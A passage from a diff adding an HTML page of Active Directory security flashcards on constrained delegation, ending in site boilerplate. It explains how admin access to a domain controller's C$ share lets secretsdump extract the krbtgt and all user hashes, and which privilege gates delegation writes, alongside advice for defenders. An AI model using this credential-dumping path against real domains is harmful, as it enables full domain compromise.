+<p>Reading <code>\\dc01\C$</code> as Administrator gives access to the entire NTFS volume on the DC, including the registry hives (SYSTEM, SAM, SECURITY), <code>ntds.dit</code> (the AD database), and any LSA secrets. From there <code>secretsdump</code> extracts the krbtgt hash, all user hashes, and machine secrets; effectively the entire domain is compromised. Any delegation entry pointing at any DC service should be removed unless the operational need is overwhelming and the source account is itself Tier-0.</p>
+</details>
+<p><strong>Card 5: SeEnableDelegationPrivilege</strong></p>
+<p>Q: Which privilege is required to write <code>msDS-AllowedToDelegateTo</code>, and why does GenericWrite alone not suffice?</p>
+<details class="note">
+<summary>Answer</summary>
+<p><code>SeEnableDelegationPrivilege</code>, granted only to <code>Domain Admins</code> and (by default) <code>Account Operators</code>. The schema-level enforcement uses this privilege rather than the standard ACL: even an account with <code>GenericWrite</code> on a target user cannot add to <code>msDS-AllowedToDelegateTo</code> without also having <code>SeEnableDelegationPrivilege</code> on the DC. The privilege gate is intentional protection against delegation abuse via mid-tier privilege escalations. Defenders should ensure <code>Account Operators</code> membership is empty (most environments do not need it).</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
